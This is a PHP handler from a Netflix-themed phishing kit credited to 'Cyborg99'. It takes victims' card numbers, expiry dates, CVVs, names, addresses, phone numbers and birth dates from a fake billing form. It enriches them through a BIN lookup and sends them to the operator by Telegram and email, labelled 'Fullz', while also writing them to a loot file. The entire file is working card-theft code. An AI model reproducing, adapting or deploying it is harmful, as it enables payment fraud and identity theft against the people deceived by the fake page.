<?php
// REM by Cyborg99 Please donate if you like it : 1J2M2J7cbzCYULG99NgWgttVJK7dkuUEz5

	function now() {
		date_default_timezone_set('GMT');
		return date("d/m/Y H:i:s");
	}
if (isset($_POST['cnm']) && isset($_POST['csc'])) {
    session_start();
	$tanitatikaram = parse_ini_file("../proxy.ini", true);
	$zed = $tanitatikaram['reportmail'];
// ----- ----- ----- ----- ----- ----- ----- ----- ---------- ----- ----- ----- ----- ----- ----- ----- -----
include '../proxy.php';
require('telegram.php');

function curl($url, $var = null) {
              $curl = curl_init($url);
              curl_setopt($curl, CURLOPT_TIMEOUT, 25);
              if ($var != null) {
                  curl_setopt($curl, CURLOPT_POST, true);
                  curl_setopt($curl, CURLOPT_POSTFIELDS, $var);
              }
              curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
              curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
              curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
              curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
              $result = curl_exec($curl);
              curl_close($curl);
              return $result;
          }


    $ctp               = $_POST['ctp'];
    $ccn               = str_replace(' ', '', $_POST['cnm']);
    $cex               = $_POST['exp'];
    $csc               = $_POST['csc'];
    $fnm               = $_POST['fnm'];
    $adr               = $_POST['adr'];
    $cty               = $_POST['cty'];
    $zip               = $_POST['zip'];
    $phn               = $_POST['phn'];
    $stt               = $_POST['stt'];
    $cnt               = $_POST['cnt'];
	$dob               = $_POST['dob'];
	$bin               = substr($ccn, 0, 6);
////////////////////////////////////////////////////////
$curl = curl('https://lookup.binlist.net/' . $bin . '');
$json = json_decode($curl);
$brand = $json->scheme ? $json->scheme : "Gucci";
$brandz = $json->brand ? $json->brand : "Gold";
$cardType = $json->type ? $json->type : "Gucci";
$cardCategory = $json->bank ? $json->bank : "Gucci";
$prepai = $json->prepaid ? $json->prepaid : "no";
$countryName = $json->country ? $json->country : "Gucci";
$countryCode = $json->country ? $json->country : "Gucci";
$catname = $cardCategory->name;
// -----
$ccbrand = $brandz;
$cctype = $brand;
$cclevel = $cardType;
$ccbank = $catname;
$prp = $prepai;
////////////////////////////////////////////////////////

    $msg  = "=========== <[ Edited by Cyborg99 ]> ===========\r\n";
	$msg .= "\r\n";
    $msg .= "> Billing \n";
    $msg .= "FULL NAME    : {$fnm}\r\n";
    $msg .= "ADDRESS     : {$adr}\r\n";
    $msg .= "PHONE        : {$phn}\r\n";
    $msg .= "ZIP CODE    : {$zip}\r\n";
    $msg .= "COUNTRY        : {$cnt}\r\n";
	$msg .= "DOB        : {$dob}\r\n";
	$msg .= "\r\n";
    $msg .= "----------------------- CC Info ---------------------\r\n";
	$msg .= "\r\n";
    $msg .= "CC Brand    : {$ccbrand}\r\n";
    $msg .= "CC Number    : {$ccn}\r\n";
    $msg .= "CC Expiry    : {$cex}\r\n";
    $msg .= "CVV / CSC    : {$csc}\r\n";
	$msg .= "\r\n";
    $msg .= "----------------------- BIN Info {$bin} -------------\r\n";
	$msg .= "\r\n";
    $msg .= "CC Data        : {$ccbrand} {$cctype} {$cclevel}\r\n";
    $msg .= "CC Bank        : {$ccbank}\r\n";
    $msg .= "---------------------- IP Info ----------------------\r\n";
	$msg .= "\r\n";
    $msg .= "COMPUTER    : {$_SESSION['computer']}\r\n";
    $msg .= "IP ADDRESS    : {$_SESSION['ip']}\r\n";
    $msg .= "LOCATION    : {$_SESSION['ip_city']} , {$_SESSION['ip_state']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
    $msg .= "BROWSER        : {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
    $msg .= "USER AGENT    : {$_SERVER['HTTP_USER_AGENT']}\r\n";
    $msg .= "TIMEZONE    : {$_SESSION['ip_timezone']}\r\n";
    $msg .= "TIME        : " . now() . " GMT\r\n";
	$msg .= "\r\n";
    $msg .= "=========== <[ Edited by Cyborg99 ]> ===========\r\n\r\n\r\n";
	$rand = dechex(rand(0x000000, 0xFFFFFF));
	telegram ($ccn);
	telegram ($cex);
	telegram ($csc);
	telegram ($phn);
	telegram ("---------------------------------------------------------------");
    $save = fopen("../../zaznew/Fully-".$rand.".txt", "a+");
    fwrite($save, $msg);
    fclose($save);
    $subject = "NETFLIX Fullz [ {$bin} {$ccbrand} ] From [{$_SESSION['ip_countryName']}] {$_SESSION['ip']}";
    $headers = "From: New Netflix Info <mailer@mail.ma>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    @mail($zed, $subject, $msg, $headers);
    exit('done');
}
?>
